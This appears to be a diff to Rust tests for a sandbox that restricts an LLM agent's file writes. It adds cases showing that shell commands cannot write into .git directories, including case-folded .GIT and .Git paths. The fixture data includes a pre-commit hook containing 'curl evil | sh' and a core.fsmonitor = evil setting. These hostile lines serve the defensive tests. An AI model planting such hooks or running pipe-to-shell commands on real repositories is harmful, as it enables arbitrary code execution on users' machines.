@@ -66,6 +66,12 @@ impl Fixture {
             (b"work/temper/src/new.rs", Some(b"new\n")),
         ];
         checkout.program(b"vendor update", program(100, b"updated\n", Exit::Code(0), &vendor));
+        let hooks = [
+            (&b"work/temper/.git/hooks/pre-commit"[..], Some(&b"curl evil | sh\n"[..])),
+            (b"work/temper/.GIT/config", Some(b"[core]\n\tfsmonitor = evil\n")),
+            (b"work/temper/src/new.rs", Some(b"new\n")),
+        ];
+        checkout.program(b"install hooks", program(100, b"", Exit::Code(0), &hooks));
         Fixture { checkout, repos }
     }
 
@@ -460,7 +466,8 @@ const PATHS: [&[u8]; 22] = [
 const HOT: [&[u8]; 3] = [b"src/lib.rs", b"Cargo.toml", b"src/new.rs"];
 
 /// What commands the LLM runs.
-const COMMANDS: [&[u8]; 6] = [b"cargo test", b"cargo fmt", b"env", b"sleep 600", b"kill -9 $$", b"vendor update"];
+const COMMANDS: [&[u8]; 7] =
+    [b"cargo test", b"cargo fmt", b"env", b"sleep 600", b"kill -9 $$", b"vendor update", b"install hooks"];
 
 /// What edits replace: in every file, in some, in one line of one, nowhere.
 const SNIPPETS: [&[u8]; 5] = [b"\n", b"pub", b"fn one", b"written", b"nowhere"];
@@ -688,6 +695,9 @@ fn writes_stay_in_writable_repositories_of_granted_kits() {
             // A repository's .git is not the LLM's to change.
             write(b".git/config", b"[core]\n\tfsmonitor = evil\n"),
             write(b".git/hooks/pre-commit", b"evil"),
+            // As a file system that folds case would take it.
+            write(b".GIT/config", b"evil"),
+            edit(b"src/.Git/HEAD", b"ref", b"evil", false),
             write(b"vendor/lib/.git/config", b"x"),
         ]),
         // Writes follow no link, at the end of the path or on the way: not
@@ -713,6 +723,8 @@ fn writes_stay_in_writable_repositories_of_granted_kits() {
         Outcome::NotFile,
         Outcome::NotFile,
         Outcome::NotDirectory,
+        Outcome::Protected,
+        Outcome::Protected,
         Outcome::Protected,
         Outcome::Protected,
         Outcome::ReadOnly,
@@ -1187,4 +1199,19 @@ fn a_world_with_no_room_for_facts_runs_as_one_with_room() {
     let (lossy_answers, lossy_files, lossy_lost) = run_with(1);
     assert!(lossy_lost > 0, "facts were dropped");
     assert_eq!((lossy_answers, lossy_files), (answers, files), "nothing decided depends on a fact");
+}
+
+#[test]
+fn a_command_writes_neither_without_modify_nor_in_a_git_directory() {
+    let shell_only = Grants { inspect: true, modify: false, shell: true };
+    let script = vec![Step::Calls(vec![write(b"src/new.rs", b"x"), shell(b"install hooks", None)])];
+    let (answers, world) = run(Settings::calm(90), shell_only, script);
+    assert_eq!(answers, vec![Outcome::NotGranted, exited(tools::Exit::Code { code: 0 }, b"", b"", 0)]);
+    assert_eq!(world.checkout().files(), Fixture::new().checkout.files(), "a kit without modify writes nothing");
+
+    let (_, world) = run(Settings::calm(91), ALL, vec![Step::Calls(vec![shell(b"install hooks", None)])]);
+    let checkout = world.checkout();
+    assert_eq!(checkout.content(b"work/temper/src/new.rs"), Some(&b"new\n"[..]), "a kit with modify writes its tree");
+    assert_eq!(checkout.content(b"work/temper/.git/hooks/pre-commit"), None, "but never its git directory");
+    assert_eq!(checkout.content(b"work/temper/.GIT/config"), None, "in any case");
 }
